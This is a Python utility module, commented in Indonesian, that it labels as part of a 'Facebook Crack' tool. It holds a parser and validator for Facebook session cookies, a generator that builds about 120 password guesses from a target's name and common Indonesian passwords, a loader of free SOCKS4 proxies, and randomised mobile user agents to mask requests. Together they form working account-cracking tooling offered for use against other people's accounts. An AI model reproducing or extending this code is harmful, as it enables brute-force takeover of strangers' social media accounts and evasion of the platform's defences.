"""
Utilitas untuk Facebook Crack
Berisi password generator, proxy manager, user agent generator, dan cookie parser
"""

import random
import requests
import os
from typing import List, Dict


class CookieParser:
    """
    Shared utility untuk parse cookie string menjadi dict
    CRITICAL: Digunakan oleh semua modul untuk konsistensi
    """
    
    @staticmethod
    def parse(cookie_str: str) -> Dict[str, str]:
        """
        Parse cookie string menjadi dict untuk requests
        
        Method ini menjadi SINGLE SOURCE OF TRUTH untuk cookie parsing.
        Semua modul (auth.py, dumper.py, cracker.py, integration) HARUS pakai ini.
        
        Args:
            cookie_str: Cookie string dari browser (e.g., "c_user=123; xs=abc; datr=xyz")
            
        Returns:
            Dict cookie siap pakai untuk requests
            
        Examples:
            >>> cookie = "c_user=100012345678; xs=test123; datr=abcd"
            >>> CookieParser.parse(cookie)
            {'c_user': '100012345678', 'xs': 'test123', 'datr': 'abcd'}
        """
        cookies = {}
        
        if not cookie_str or not isinstance(cookie_str, str):
            return cookies
        
        try:
            for item in cookie_str.split(';'):
                item = item.strip()
                if '=' in item:
                    key, value = item.split('=', 1)
                    cookies[key.strip()] = value.strip()
        except Exception:
            pass
        
        return cookies
    
    @staticmethod
    def validate(cookies: Dict[str, str]) -> tuple[bool, str]:
        """
        Validasi apakah cookie dict memiliki field yang diperlukan
        
        Args:
            cookies: Dict cookies hasil parsing
            
        Returns:
            Tuple (valid, error_message)
        """
        required_fields = ['c_user', 'xs']
        missing = [field for field in required_fields if field not in cookies]
        
        if missing:
            return (False, f"Cookie tidak lengkap. Field yang hilang: {', '.join(missing)}")
        
        if not cookies['c_user'].isdigit():
            return (False, "Field c_user harus berupa angka (user ID)")
        
        return (True, "Cookie valid")


class PasswordGenerator:
    """Generator password untuk cracking - UPGRADED dengan 100+ kombinasi password"""
    
    @staticmethod
    def generate(name: str) -> List[str]:
        """
        Generate list password dari nama dengan 100+ kombinasi GACOR!
        
        Args:
            name: Nama target
            
        Returns:
            List password yang akan dicoba (100+ kombinasi unik)
        """
        name = name.lower().strip()
        first_name = name.split(" ")[0] if " " in name else name
        last_name = name.split(" ")[-1] if " " in name and len(name.split(" ")) > 1 else ""
        full_name = name.replace(" ", "")
        
        passwords = []
        
        if len(first_name) >= 3:
            passwords.extend([
                first_name,
                first_name + "123",
                first_name + "1234",
                first_name + "12345",
                first_name + "123456",
                first_name + "1234567",
                first_name + "12345678",
                first_name + "321",
                first_name + "123321",
                first_name + "@123",
                first_name + "@12345",
                first_name + "@@",
                first_name + "@@@",
                first_name + "!!",
                first_name + "!!!",
                first_name + "786",
                first_name + "007",
                first_name + "69",
                first_name + "2020",
                first_name + "2021",
                first_name + "2022",
                first_name + "2023",
                first_name + "2024",
                first_name + "2025",
                first_name + "2019",
                first_name + "2018",
                first_name + "2000",
                first_name + "1999",
                first_name + "1998",
                first_name + "1997",
                first_name + "1996",
                first_name + "1995",
                first_name + "99",
                first_name + "98",
                first_name + "01",
                first_name + "02",
                first_name + "03",
                "123" + first_name,
                "123456" + first_name,
                first_name + "sayang",
                first_name + "ganteng",
                first_name + "cantik",
                first_name + "aja",
                first_name + "doang",
                first_name + "bang",
                first_name + "kun",
                first_name + "chan",
                first_name.capitalize(),
                first_name.upper(),
                first_name + first_name,
            ])
        
        if last_name and len(last_name) >= 3:
            passwords.extend([
                last_name,
                last_name + "123",
                last_name + "1234",
                last_name + "12345",
                last_name + "321",
                last_name + "2024",
                last_name + "2025",
                last_name.capitalize(),
                first_name + last_name,
                last_name + first_name,
            ])
        
        if len(full_name) >= 6:
            passwords.extend([
                full_name,
                full_name + "123",
                full_name + "321",
                full_name + "2024",
            ])
        
        passwords.extend([
            "bismillah",
            "bismillah123",
            "bismillah1",
            "alhamdulillah",
            "subhanallah",
            "mashaallah",
            "sayangku",
            "sayangku123",
            "sayangkamu",
            "sayang",
            "sayang123",
            "sayangmu",
            "kucingku",
            "anjingku",
            "anjing",
            "kucing",
            "indonesia",
            "indonesia123",
            "indonesiaku",
            "nusantara",
            "merdeka",
            "garuda",
            "123456",
            "1234567",
            "12345678",
            "123456789",
            "1234567890",
            "654321",
            "112233",
            "111111",
            "000000",
            "123123",
            "password",
            "password123",
            "password1",
            "pass123",
            "qwerty",
            "qwerty123",
            "qwerty12345",
            "asdfgh",
            "zxcvbn",
            "123qwe",
            "qwe123",
            "abc123",
            "admin",
            "admin123",
            "welcome",
            "welcome123",
            "iloveyou",
            "iloveu",
            "loveyou",
            "fuckyou",
            "monkey",
            "dragon",
            "master",
            "killer",
            "superman",
            "batman",
            "naruto",
            "sasuke",
            "goku",
            "luffy",
            "gaming",
            "gamer",
            "legend",
            "pro",
            "noob",
            "anjay",
            "anjir",
            "kontol",
            "memek",
            "bangsat",
        ])
        
        seen = set()
        unique_passwords = []
        for pwd in passwords:
            if pwd and pwd not in seen and len(pwd) >= 3:
                seen.add(pwd)
                unique_passwords.append(pwd)
        
        return unique_passwords[:120]


class ProxyManager:
    """Manager untuk proxy"""
    
    def __init__(self):
        self.proxies = []
        self.load_proxies()
    
    def load_proxies(self):
        """Load proxy dari file atau API"""
        try:
            if os.path.exists(".prox.txt"):
                with open(".prox.txt", "r") as f:
                    self.proxies = f.read().splitlines()
            
            if not self.proxies:
                prox = requests.get(
                    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all",
                    timeout=10
                ).text
                with open(".prox.txt", "w") as f:
                    f.write(prox)
                self.proxies = prox.splitlines()
        except:
            self.proxies = []
    
    def get_proxy(self) -> dict:
        """
        Dapatkan random proxy
        
        Returns:
            Dict proxy untuk requests
        """
        if not self.proxies:
            return {}
        
        proxy = random.choice(self.proxies)
        return {
            'http': f'socks4://{proxy}',
            'https': f'socks4://{proxy}'
        }


class UserAgentGenerator:
    """Generator User Agent"""
    
    @staticmethod
    def get_random() -> str:
        """
        Dapatkan random user agent
        
        Returns:
            User agent string
        """
        user_agents = []
        
        for _ in range(100):
            android = random.choice(['10', '11', '12', '13'])
            chrome = random.randrange(80, 120)
            build = random.randrange(4200, 4900)
            
            ua = f'Mozilla/5.0 (Linux; Android {android}; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome}.0.{build}.{random.randrange(40, 150)} Mobile Safari/537.36'
            user_agents.append(ua)
        
        return random.choice(user_agents)
